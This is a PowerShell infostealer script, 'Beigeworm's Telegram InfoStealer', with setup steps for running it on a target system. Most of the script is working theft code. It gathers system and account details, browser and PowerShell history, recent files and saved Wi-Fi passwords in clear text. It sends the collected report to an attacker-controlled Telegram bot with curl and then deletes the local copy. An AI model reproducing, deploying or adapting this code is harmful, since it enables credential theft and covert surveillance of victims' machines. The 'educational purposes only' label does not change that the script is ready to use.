﻿<#
============================================= Beigeworm's Telegram InfoStealer ========================================================

SYNOPSIS
This script connects target computer with a telegram chat to send powershell commands.

SETUP INSTRUCTIONS
1. visit https://t.me/botfather and make a bot.
2. add bot api to script.
3. search for bot in top left box in telegram and start a chat then type /start.
4. Replace YOUR_BOT_TOKEN_FOR_TELEGRAM with your bot token
5. Run Script on target System

THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
#>

$token='YOUR_BOT_TOKEN_FOR_TELEGRAM'
$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
$URL = 'https://api.telegram.org/bot{0}' -f $Token

while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    Sleep 10
}

$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
Function Post-Message{$script:params = @{chat_id = $ChatID ;text = $contents};Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params}
Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null}


$contents = "$comp Gathering System Information for $env:COMPUTERNAME $comp"
Post-Message
$userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$OSString = "$($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString = "Processor : $($processorInfo.Name)"
$systemString += "`nMemory : $RamInfo"
$systemString += "`nGpu : $($videocardinfo.Name)"
$systemString += "`nStorage : $Hddinfo"
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
$FilePath = "$env:temp\systeminfo.txt"
$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
$contents = "========================================================

Current User    : $env:USERNAME
Email Address   : $email
Language        : $systemLanguage
Keyboard Layout : $keyboardLayoutID
Other Accounts  : $users
Public IP       : $computerPubIP
Current OS      : $OSString
Hardware Info
--------------------------------------------------------
$systemString"
"--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $FilePath -Encoding ASCII
"General Info `n $contents" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Network Info `n -----------------------------------------------------------------------`n$outssid" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"USB Info  `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($COMDevices| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($software| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Processes  `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Services `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Drivers `n -----------------------------------------------------------------------`n$drivers" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($Value| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($RecentFiles | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
Post-Message
Post-File ;rm -Path $FilePath -Force
